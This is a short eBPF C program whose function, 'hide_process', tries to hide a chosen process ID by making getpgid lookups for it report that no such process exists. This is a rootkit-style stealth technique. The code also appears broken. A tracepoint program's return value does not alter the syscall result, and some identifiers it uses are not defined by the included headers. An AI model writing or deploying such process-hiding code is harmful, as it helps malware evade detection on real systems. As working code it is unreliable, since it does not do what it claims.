#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u64);
} hidden_pids SEC(".maps");

SEC("tracepoint/syscalls/sys_enter_getpgid")
int hide_process(struct trace_event_raw_sys_enter *ctx) {
    __u32 key = 0;
    __u64 *pid_ptr = bpf_map_lookup_elem(&hidden_pids, &key);
    
    if (pid_ptr && ctx->args[0] == *pid_ptr) {
        // Return error - process doesn't exist
        return -ESRCH;
    }
    
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
